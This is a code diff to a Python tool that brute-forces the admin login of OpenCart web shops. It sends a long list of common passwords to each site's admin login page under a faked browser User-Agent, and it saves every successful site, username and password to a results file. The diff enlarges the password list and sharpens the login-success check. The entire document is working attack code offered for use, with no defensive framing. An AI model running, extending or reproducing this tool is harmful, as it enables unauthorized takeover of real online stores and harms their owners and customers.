@@ -33,14 +33,14 @@ banner = '''
 '''
 
 def brute(url):
-    password = ['admin', 'admin1', 'admin12', 'admin123', 'admin1234', 'admin12345', 'qwerty']
+    password = ["123", "1", "admin", "123456", "pass", "password", "admin123", "12345", "admin@123", "123", "test", "123456789", "1234", "12345678", "123123", "demo", "blah", "hello", "1234567890", "zx321654xz", "1234567", "adminadmin", "welcome", "666666", "access", "1q2w3e4r", "xmagico", "admin1234", "logitech", "p@ssw0rd", "login", "test123", "root", "pass123", "password1", "qwerty", "111111", "gimboroot"]
     for passwd in password:
         try:
             url = url.strip()
             head = {'User-Agent' : 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:35.0) Gecko/20100101 Firefox/35.0'}
             payload = {'username':'admin', 'password': passwd}
             login = r.post(url + '/admin/index.php?route=common/login', headers = head, data = payload)
-            if 'logout' in login.text:
+            if 'common/logout' in login.text:
                 print( C + url + "|" + "admin" + "|" + passwd + "[SUCCESS]" )
                 open('result_opencart.txt', 'a').write(url + '|' + 'admin' + '|' + passwd + '\n')
             else:
